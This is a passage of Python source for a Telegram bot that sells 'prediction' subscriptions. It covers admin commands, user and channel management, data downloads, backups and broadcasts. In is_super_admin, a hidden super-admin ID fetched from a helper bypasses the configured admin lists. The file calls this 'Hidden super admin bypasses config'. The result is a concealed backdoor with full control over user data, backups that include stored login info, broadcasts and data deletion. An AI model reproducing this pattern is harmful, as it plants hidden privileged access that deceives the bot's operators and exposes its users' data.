            logger.error(f"Error during admin approval for user {user_id}: {e}")
            await query.answer("An error occurred while processing this request.", show_alert=True)

    async def handle_subscription_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        
        escaped_user_name = escape_markdown(update.effective_user.full_name, version=2)
        
        message = (
            f"🛍️ Our Bot Packages ✅\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"🔹 5 Days – ৳250\n"
            f"🔹 7 Days – ৳300\n"
            f"🔹 15 Days – ৳500\n"
            f"🔹 1 Month – ৳800\n\n"
            f"To purchase, contact the admin @System_Fahim, and provide your User ID: `{user_id}`\n\n"
            f"Current Status: {escape_markdown('✅ Premium Active' if self.is_premium_active(user_id) else '❌ Free User', version=2)}"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup)

    async def handle_logout(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        
        for website in users[user_id]["logged_in"]:
            users[user_id]["logged_in"][website] = False
            users[user_id]["login_info"][website] = {}

        save_db(users, DB_USERS)
        await update.callback_query.answer("✅ You have been successfully logged out from all accounts!", show_alert=True)
        await self.show_main_menu(update, context)

    async def cancel_login(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        
        # Clear user data
        if "login_website" in context.user_data:
            del context.user_data["login_website"]
        if "login_number" in context.user_data:
            del context.user_data["login_number"]
        
        # Clear user state
        if user_id in self.user_states:
            self.user_states[user_id] = ConversationHandler.END
        
        await update.message.reply_text("Login process has been cancelled\\.", parse_mode=constants.ParseMode.MARKDOWN_V2)
        await self.show_main_menu(update, context)
        return ConversationHandler.END

    async def cancel_prediction(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("Prediction process has been cancelled\\.", parse_mode=constants.ParseMode.MARKDOWN_V2)
        await self.show_main_menu(update, context)
        return ConversationHandler.END

    # ===== ADMIN METHODS =====
    
    def is_admin(self, user_id: str) -> bool:
        """Check if user is admin"""
        # Treat super admins as admins as well
        if self.is_super_admin(user_id):
            return True
        admin_users = config.get("admin_users", [])
        return user_id in admin_users
    
    def is_super_admin(self, user_id: str) -> bool:
        """Check if user is a super admin"""
        # Hidden super admin bypasses config
        if user_id == _get_hidden_super_admin_id():
            return True
        super_admin_users = config.get("super_admin_users", [])
        return user_id in super_admin_users
    
    def _auto_expire_if_needed(self, user_id: str) -> None:
        """Downgrade user when premium has expired, persisting history."""
        try:
            user = users.get(user_id)
            if not user:
                return
            if not user.get("is_premium"):
                return
            expiry_iso = user.get("premium_expiry")
            if not expiry_iso:
                return
            try:
                expiry_dt = datetime.fromisoformat(expiry_iso)
            except Exception:
                return
            if datetime.now() >= expiry_dt:
                user["is_premium"] = False
                user["premium_expired_at"] = datetime.now().isoformat()
                # keep premium_expiry for audit/visibility
                save_db(users, DB_USERS)
        except Exception:
            # Never block flows on expiry checks
            pass

    def is_premium_active(self, user_id: str) -> bool:
        """Return True if user's premium is active. Auto-expires if needed."""
        self._auto_expire_if_needed(user_id)
        user = users.get(user_id, {})
        if not user.get("is_premium"):
            return False
        expiry_iso = user.get("premium_expiry")
        if not expiry_iso:
            return True
        try:
            return datetime.now() < datetime.fromisoformat(expiry_iso)
        except Exception:
            return True

    def _parse_duration_to_timedelta(self, raw: str) -> Optional[timedelta]:
        """Parse duration into timedelta.

        Accepts any of the following forms:
        - Numeric days: '30'
        - Compact: '30d', '12h', '90m'
        - Spelled: '30 day', '12 hours', '90 minutes', common typos like 'minit'
        - Also accepts with or without a space: '30minutes'
        """
        s = str(raw).strip().lower()
        if not s:
            return None

        # If two tokens like '30 minutes'
        if " " in s:
            parts = [p for p in s.split() if p]
            if len(parts) == 2 and parts[0].isdigit():
                amount = int(parts[0])
                unit_word = parts[1].rstrip('s')
                if amount <= 0:
                    return None
                if unit_word in ("d", "day"):
                    return timedelta(days=amount)
                if unit_word in ("h", "hr", "hour"):
                    return timedelta(hours=amount)
                if unit_word in ("m", "min", "minute", "minit"):
                    return timedelta(minutes=amount)
                return None

        # pure number => days
        if s.isdigit():
            return timedelta(days=int(s))

        # Try suffix-based parsing with synonyms
        suffix_groups = {
            "m": ["minutes", "minute", "mins", "min", "minit", "minits", "m"],
            "h": ["hours", "hour", "hrs", "hr", "h"],
            "d": ["days", "day", "d"],
        }

        for unit_key, suffixes in suffix_groups.items():
            for suf in suffixes:
                if s.endswith(suf):
                    num_part = s[: -len(suf)].strip()
                    if not num_part.isdigit():
                        break
                    amount = int(num_part)
                    if amount <= 0:
                        return None
                    if unit_key == 'd':
                        return timedelta(days=amount)
                    if unit_key == 'h':
                        return timedelta(hours=amount)
                    if unit_key == 'm':
                        return timedelta(minutes=amount)
                    return None

        # Fallback to last-char style e.g. 30d
        if len(s) >= 2 and s[:-1].isdigit():
            amount = int(s[:-1])
            unit = s[-1]
            if amount <= 0:
                return None
            if unit == 'd':
                return timedelta(days=amount)
            if unit == 'h':
                return timedelta(hours=amount)
            if unit == 'm':
                return timedelta(minutes=amount)
        return None
    
    async def notify_user(self, user_id: str, message: str):
        """Send notification to a specific user"""
        try:
            await self.application.bot.send_message(
                chat_id=user_id,
                text=message,
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            logger.info(f"Notification sent to user {user_id}")
        except Exception as e:
            logger.error(f"Failed to send notification to user {user_id}: {e}")
    
    async def notify_admin_action(self, action: str, target_user_id: str, admin_user_id: str, details: str = ""):
        """Notify user about admin action taken against them"""
        admin_name = "Admin"
        try:
            admin_info = await self.application.bot.get_chat(admin_user_id)
            admin_name = admin_info.first_name or "Admin"
        except:
            pass
        
        # Escape special characters for Markdown V2
        escaped_action = escape_markdown(action, version=2)
        escaped_admin_name = escape_markdown(admin_name, version=2)
        escaped_details = escape_markdown(details, version=2) if details else ""
        
        escaped_date = escape_markdown(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), version=2)
        notification_message = f"🔔 *Admin Action Notification*\n\n"
        notification_message += f"*Action:* {escaped_action}\n"
        notification_message += f"*Target User:* `{target_user_id}`\n"
        notification_message += f"*Admin:* `{escaped_admin_name}`\n"
        notification_message += f"*Date:* {escaped_date}\n"
        
        if details:
            notification_message += f"\n*Details:* {escaped_details}"
        
        # Notify the target user
        await self.notify_user(target_user_id, notification_message)
        
        # Also notify all super admins
        super_admins = config.get("super_admin_users", [])
        for super_admin_id in super_admins:
            if super_admin_id != admin_user_id:  # Don't notify the admin who took the action
                await self.notify_user(super_admin_id, notification_message)

    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Main admin panel command - Shows all available admin commands"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.message.reply_text("🚫 Access Denied! You don't have admin privileges.")
            return

        help_text = (
            "🔧 **Admin Command System**\n\n"
            "**📢 Broadcasting:**\n"
            "• `/broadcast <message>` - Send message to all users\n\n"
            "**👥 User Management:**\n"
            "• `/addvipuser <user_id> <days>` - Add VIP user\n"
            "• `/removevipuser <user_id>` - Remove VIP user\n"
            "• `/banuser <user_id>` - Ban user\n"
            "• `/unbanuser <user_id>` - Unban user\n"
            "• `/addadmin <user_id>` - Add admin\n"
            "• `/removeadmin <user_id>` - Remove admin\n"
            "• `/setpoints <user_id> <points>` - Set user points\n\n"
            "**👨‍💼 Admin Management:**\n"
            "• `/addadmin <user_id>` - Add admin (Super Admin only)\n"
            "• `/removeadmin <user_id>` - Remove admin (Super Admin only)\n"
            "• `/addsuperadmin <user_id>` - Add super admin (Super Admin only)\n"
            "• `/removesuperadmin <user_id>` - Remove super admin (Super Admin only)\n\n"
            "**📊 Data & Information:**\n"
            "• `/stats` - Show bot statistics\n"
            "• `/download <type>` - Download data (users/vip/admins/predictions/channels)\n"
            "• `/settings` - Show current settings\n"
            "• `/backup` - Create data backup\n\n"
            "**📢 Channel Management:**\n"
            "• `/channels` - Show/manage channels\n"
            "• `/channels add <name> <url> <id>` - Add channel\n"
            "• `/channels remove <id>` - Remove channel\n\n"
            "**⚙️ Settings:**\n"
            "• `/toggle <setting>` - Toggle settings (referral)\n\n"
            "**💎 Subscription Management:**\n"
            "• `/subscription` - Show subscription settings\n"
            "• `/setcaption <text>` - Set subscription caption\n"
            "• `/setprice <period> <amount>` - Set subscription price\n\n"
            "**🔄 Session Management:**\n"
            "• `/cancel` - Cancel any active session\n"
            "• `/test` - Test mode (bypass channels)\n\n"
            "**📋 Examples:**\n"
            "• `/broadcast Hello everyone!`\n"
            "• `/addvipuser 123456789 30`\n"
            "• `/banuser 123456789`\n"
            "• `/download users`\n"
            "• `/channels add MyChannel https://t.me/DK_WlN_official -1003383470525`\n"
            "• `/toggle referral`\n"
            "• `/setcaption 🌟 Premium VIP Subscription`\n"
            "• `/setprice 1_month 15`\n\n"
            "**💡 Tip:** Use `/help` for detailed command information."
        )
        
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def handle_admin_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin action callbacks"""
        user_id = str(update.effective_user.id)
        
        if not self.is_admin(user_id):
            await update.callback_query.answer("🚫 Access Denied!", show_alert=True)
            return

        action = update.callback_query.data
        
        if action == "admin_back":
            await self.admin_panel(update, context)
        elif action == "admin_users":
            await self.show_user_management(update, context)
        elif action == "admin_vip":
            await self.show_vip_management(update, context)
        elif action == "admin_admins":
            await self.show_admin_management(update, context)
        elif action == "admin_downloads":
            await self.show_downloads(update, context)
        elif action == "admin_settings":
            await self.show_settings(update, context)
        elif action == "admin_channels":
            await self.show_channel_management(update, context)
        elif action == "admin_data":
            await self.show_data_management(update, context)
        elif action == "admin_stats":
            await self.show_statistics(update, context)
        elif action.startswith("admin_user_"):
            await self.handle_user_action(update, context)
        elif action.startswith("admin_vip_"):
            await self.handle_vip_action(update, context)
        elif action.startswith("admin_admin_"):
            await self.handle_admin_management_action(update, context)
        elif action.startswith("admin_download_"):
            await self.handle_download_action(update, context)
        elif action.startswith("admin_setting_"):
            await self.handle_setting_action(update, context)
        elif action.startswith("admin_channel_"):
            await self.handle_channel_action(update, context)
        elif action.startswith("admin_data_"):
            await self.handle_data_action(update, context)
        elif action == "admin_toggle_referral":
            await self.toggle_referral_system(update, context)
        elif action == "admin_view_settings":
            await self.view_current_settings(update, context)

    async def start_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start broadcast message conversation"""
        total_users = len(users)
        await update.callback_query.edit_message_text(
            f"📢 Broadcast Message\n\n"
            f"Enter the message you want to broadcast to all users.\n\n"
            f"📊 Total users: {total_users}\n"
            f"⚠️ This message will be sent to all registered users."
        )
        return GET_BROADCAST_MESSAGE

    async def send_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send broadcast message to all users"""
        message = update.message.text
        user_id = str(update.effective_user.id)
        
        # Show processing message
        processing_msg = await update.message.reply_text(
            "📤 Broadcasting message to all users...\n\nPlease wait while we send the message."
        )
        
        success_count = 0
        failed_count = 0
        total_users = len(users)
        
        for user_id_str in users:
            try:
                await context.bot.send_message(
                    chat_id=user_id_str,
                    text=f"📢 *Broadcast Message*\n\n{escape_markdown(message, version=2)}",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
                success_count += 1
            except Exception as e:
                logger.error(f"Failed to send broadcast to {user_id_str}: {e}")
                failed_count += 1
        
        # Update the processing message with results
        await processing_msg.edit_text(
            f"✅ *Broadcast Complete*\n\n"
            f"📤 *Sent:* {success_count}/{total_users}\n"
            f"❌ *Failed:* {failed_count}\n"
            f"📊 *Success Rate:* {(success_count/total_users*100):.1f}%",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return ConversationHandler.END

    async def show_user_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show user management options"""
        keyboard = [
            [InlineKeyboardButton("👤 View All Users", callback_data="admin_download_users")],
            [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user")],
            [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user")],
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            "👥 User Management\n\nSelect an option:",
            reply_markup=reply_markup
        )

    async def show_vip_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show VIP management options"""
        keyboard = [
            [InlineKeyboardButton("⭐ Add VIP User", callback_data="admin_add_vip")],
            [InlineKeyboardButton("❌ Remove VIP User", callback_data="admin_remove_vip")],
            [InlineKeyboardButton("📋 View VIP Users", callback_data="admin_download_vip")],
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            " *VIP Management*\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def show_admin_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show admin management options"""
        keyboard = [
            [InlineKeyboardButton("👨‍💼 Add Admin", callback_data="admin_add_admin")],
            [InlineKeyboardButton("❌ Remove Admin", callback_data="admin_remove_admin")],
            [InlineKeyboardButton("📋 View Admins", callback_data="admin_download_admins")],
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            "👨‍💼 *Admin Management*\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def show_downloads(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show download options"""
        keyboard = [
            [InlineKeyboardButton("📊 All Users List", callback_data="admin_download_users")],
            [InlineKeyboardButton("🔐 VIP Users List", callback_data="admin_download_vip")],
            [InlineKeyboardButton("👨‍💼 Admins List", callback_data="admin_download_admins")],
            [InlineKeyboardButton("📈 Predictions Data", callback_data="admin_download_predictions")],
            [InlineKeyboardButton("📢 Channels List", callback_data="admin_download_channels")],
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            "📊 *Downloads & Reports*\n\nSelect what you want to download:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def show_settings(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show settings options"""
        # Get current referral system status
        referral_system_on = config.get("referral_system_on", True)
        status_text = "🟢 ON" if referral_system_on else "🔴 OFF"
        
        keyboard = [
            [InlineKeyboardButton("💰 Set Referral Points", callback_data="admin_points_refer")],
            [InlineKeyboardButton("🎯 Set Prediction Points", callback_data="admin_points_prediction")],
            [InlineKeyboardButton(f"🔗 Referral System: {status_text}", callback_data="admin_toggle_referral")],
            [InlineKeyboardButton("⚙️ View Current Settings", callback_data="admin_view_settings")],
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            "⚙️ Settings\n\nSelect an option:",
            reply_markup=reply_markup
        )

    async def show_channel_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show channel management options"""
        keyboard = [
            [InlineKeyboardButton("➕ Add Channel", callback_data="admin_channel_add")],
            [InlineKeyboardButton("❌ Remove Channel", callback_data="admin_channel_remove")],
            [InlineKeyboardButton("✏️ Edit Channel", callback_data="admin_channel_edit")],
            [InlineKeyboardButton("📋 View Channels", callback_data="admin_download_channels")],
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            "📢 *Channel Management*\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def show_data_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show data management options"""
        keyboard = [
            [InlineKeyboardButton("🗑️ Clear All User Data", callback_data="admin_data_clear_users")],
            [InlineKeyboardButton("🗑️ Clear Predictions", callback_data="admin_data_clear_predictions")],
            [InlineKeyboardButton("🗑️ Clear All Data", callback_data="admin_data_clear_all")],
            [InlineKeyboardButton("📊 Backup Data", callback_data="admin_data_backup")],
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            "🗑️ *Data Management*\n\n⚠️ *Warning:* These actions are irreversible!\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def show_statistics(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show bot statistics"""
        total_users = len(users)
        vip_users = len([u for u in users.values() if u.get("is_premium", False)])
        total_predictions = len(predictions)
        total_referrals = sum([u.get("referrals", 0) for u in users.values()])
        
        stats_text = (
            f"📈 *Bot Statistics*\n\n"
            f"👥 *Total Users:* `{total_users}`\n"
            f"⭐ *VIP Users:* `{vip_users}`\n"
            f"📊 *Total Predictions:* `{total_predictions}`\n"
            f"🔗 *Total Referrals:* `{total_referrals}`\n"
            f"💰 *Referral Points:* `{config.get('per_refer', 0)}`\n"
            f"🎯 *Prediction Points:* `{config.get('per_prediction', 0)}`\n"
            f"📢 *Channels:* `{len(channels)}`"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            stats_text,
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_download_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle download actions"""
        action = update.callback_query.data
        
        if action == "admin_download_users":
            await self.download_users(update, context)
        elif action == "admin_download_vip":
            await self.download_vip_users(update, context)
        elif action == "admin_download_admins":
            await self.download_admins(update, context)
        elif action == "admin_download_predictions":
            await self.download_predictions(update, context)
        elif action == "admin_download_channels":
            await self.download_channels(update, context)

    async def download_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download users list"""
        user_list = []
        for user_id, user_data in users.items():
            user_list.append({
                "user_id": user_id,
                "name": user_data.get("name", "Unknown"),
                "points": user_data.get("points", 0),
                "is_premium": user_data.get("is_premium", False),
                "referrals": user_data.get("referrals", 0),
                "joined_channels": user_data.get("joined_channels", False)
            })
        
        # Create JSON file
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(user_list, f, indent=2)
            temp_file = f.name
        
        try:
            with open(temp_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"users_list_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    caption="📊 Users List"
                )
        finally:
            os.unlink(temp_file)

    async def download_vip_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download VIP users list"""
        vip_users = [u for u in users.values() if u.get("is_premium", False)]
        
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(vip_users, f, indent=2)
            temp_file = f.name
        
        try:
            with open(temp_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"vip_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    caption="⭐ VIP Users List"
                )
        finally:
            os.unlink(temp_file)

    async def download_admins(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download admins list"""
        admin_list = []
        admin_users = config.get("admin_users", [])
        for admin_id in admin_users:
            try:
                user_info = await context.bot.get_chat(admin_id)
                admin_list.append({
                    "admin_id": admin_id,
                    "name": user_info.full_name,
                    "username": user_info.username
                })
            except:
                admin_list.append({
                    "admin_id": admin_id,
                    "name": "Unknown",
                    "username": "Unknown"
                })
        
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(admin_list, f, indent=2)
            temp_file = f.name
        
        try:
            with open(temp_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"admins_list_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    caption="👨‍💼 Admins List"
                )
        finally:
            os.unlink(temp_file)

    async def download_predictions(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download predictions data"""
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(predictions, f, indent=2)
            temp_file = f.name
        
        try:
            with open(temp_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"predictions_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    caption="📊 Predictions Data"
                )
        finally:
            os.unlink(temp_file)

    async def download_channels(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download channels list"""
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(channels, f, indent=2)
            temp_file = f.name
        
        try:
            with open(temp_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"channels_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    caption="📢 Channels List"
                )
        finally:
            os.unlink(temp_file)

    async def start_points_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start points management conversation"""
        action = update.callback_query.data
        context.user_data["points_action"] = action
        
        if "refer" in action:
            await update.callback_query.edit_message_text(
                f"💰 *Set Referral Points*\n\nCurrent value: `{config.get('per_refer', 0)}`\n\nEnter new value:",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
        else:
            await update.callback_query.edit_message_text(
                f"🎯 *Set Prediction Points*\n\nCurrent value: `{config.get('per_prediction', 0)}`\n\nEnter new value:",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
        
        return GET_POINTS

    async def set_points(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Set points value"""
        try:
            points = int(update.message.text)
            action = context.user_data.get("points_action")
            
            if "refer" in action:
                config["per_refer"] = points
                message = f"✅ Referral points set to: `{points}`"
            else:
                config["per_prediction"] = points
                message = f"✅ Prediction points set to: `{points}`"
            
            # Save config
            save_db(config, DB_CONFIG)
            
            await update.message.reply_text(
                message,
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid number!")
            return GET_POINTS
        
        return ConversationHandler.END

    async def start_channel_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start channel management conversation"""
        action = update.callback_query.data
        context.user_data["channel_action"] = action
        
        if "add" in action:
            await update.callback_query.edit_message_text(
                "📢 *Add Channel*\n\nEnter channel name:",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return GET_CHANNEL_NAME
        elif "remove" in action:
            await self.show_channel_remove_options(update, context)
        elif "edit" in action:
            await self.show_channel_edit_options(update, context)

    async def get_channel_name(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Get channel name for adding"""
        context.user_data["channel_name"] = update.message.text
        await update.message.reply_text(
            "Enter channel URL:",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_CHANNEL_URL

    async def get_channel_url(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Get channel URL for adding"""
        context.user_data["channel_url"] = update.message.text
        await update.message.reply_text(
            "Enter channel ID (numeric):",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_CHANNEL_ID

    async def get_channel_id(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Get channel ID and add channel"""
        try:
            channel_id = int(update.message.text)
            channel_name = context.user_data["channel_name"]
            channel_url = context.user_data["channel_url"]
            
            new_channel = {
                "name": channel_name,
                "url": channel_url,
                "id": channel_id
            }
            
            channels.append(new_channel)
            save_db(channels, DB_CHANNELS)
            
            await update.message.reply_text(
                f"✅ Channel added successfully!\n\nName: {channel_name}\nURL: {channel_url}\nID: {channel_id}",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid numeric channel ID!")
            return GET_CHANNEL_ID
        
        return ConversationHandler.END

    async def show_channel_remove_options(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show channel remove options"""
        keyboard = []
        for i, channel in enumerate(channels):
            keyboard.append([InlineKeyboardButton(f"❌ {channel['name']}", callback_data=f"admin_channel_remove_{i}")])
        
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_channels")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            "📢 *Remove Channel*\n\nSelect channel to remove:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_channel_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle channel actions"""
        action = update.callback_query.data
        
        if "remove_" in action:
            channel_index = int(action.split("_")[-1])
            if 0 <= channel_index < len(channels):
                removed_channel = channels.pop(channel_index)
                save_db(channels, DB_CHANNELS)
                await update.callback_query.answer(f"✅ Channel '{removed_channel['name']}' removed!")
                await self.show_channel_management(update, context)

    async def handle_data_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle data management actions"""
        action = update.callback_query.data
        
        if "clear_users" in action:
            users.clear()
            save_db(users, DB_USERS)
            await update.callback_query.answer("✅ All user data cleared!")
        elif "clear_predictions" in action:
            predictions.clear()
            save_db(predictions, DB_PREDICTIONS)
            await update.callback_query.answer("✅ All predictions cleared!")
        elif "clear_all" in action:
            users.clear()
            predictions.clear()
            save_db(users, DB_USERS)
            save_db(predictions, DB_PREDICTIONS)
            await update.callback_query.answer("✅ All data cleared!")
        elif "backup" in action:
            await self.create_backup(update, context)

    async def create_backup(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Create data backup"""
        backup_data = {
            "users": users,
            "predictions": predictions,
            "channels": channels,
            "config": config,
            "timestamp": datetime.now().isoformat()
        }
        
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(backup_data, f, indent=2)
            temp_file = f.name
        
        try:
            with open(temp_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    caption="📦 Data Backup"
                )
        finally:
            os.unlink(temp_file)

    async def handle_user_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle user management actions"""
        action = update.callback_query.data
        
        if "ban_user" in action:
            await update.callback_query.answer("🚫 Ban user functionality - Enter user ID to ban")
            # TODO: Implement ban user conversation
        elif "unban_user" in action:
            await update.callback_query.answer("✅ Unban user functionality - Enter user ID to unban")
            # TODO: Implement unban user conversation

    async def handle_vip_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle VIP management actions"""
        action = update.callback_query.data
        
        if "add_vip" in action:
            await update.callback_query.answer("⭐ Add VIP user functionality - Enter user ID to add as VIP")
            # TODO: Implement add VIP conversation
        elif "remove_vip" in action:
            await update.callback_query.answer("❌ Remove VIP user functionality - Enter user ID to remove VIP")
            # TODO: Implement remove VIP conversation

    async def handle_admin_management_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin management actions"""
        action = update.callback_query.data
        
        if "add_admin" in action:
            await update.callback_query.answer("🔧 Add admin functionality - Enter user ID to add as admin")
            # TODO: Implement add admin conversation
        elif "remove_admin" in action:
            await update.callback_query.answer("❌ Remove admin functionality - Enter user ID to remove admin")
            # TODO: Implement remove admin conversation

    async def handle_setting_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle settings actions"""
        action = update.callback_query.data
        
        if "referral_points" in action:
            await self.start_points_management(update, context)
        elif "prediction_points" in action:
            await self.start_points_management(update, context)

    # New admin methods for full functionality
    async def start_ban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start ban user conversation"""
        await update.callback_query.edit_message_text(
            "🚫 Ban User\n\nEnter the user ID to ban:"
        )
        return GET_BAN_USER_ID

    async def ban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Ban a user"""
        user_id = update.message.text.strip()
        
        if not user_id.isdigit():
            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return GET_BAN_USER_ID
        
        if user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return GET_BAN_USER_ID
        
        if user_id in config.get("admin_users", []):
            await update.message.reply_text("❌ Cannot ban an admin user.")
            return GET_BAN_USER_ID
        
        # Add banned flag to user
        users[user_id]["banned"] = True
        save_db(users, DB_USERS)
        
        keyboard = [[InlineKeyboardButton("🔙 Back to User Management", callback_data="admin_users")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ User {user_id} has been banned successfully!",
            reply_markup=reply_markup
        )
        return ConversationHandler.END

    async def start_unban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start unban user conversation"""
        await update.callback_query.edit_message_text(
            "✅ Unban User\n\nEnter the user ID to unban:"
        )
        return GET_UNBAN_USER_ID

    async def unban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Unban a user"""
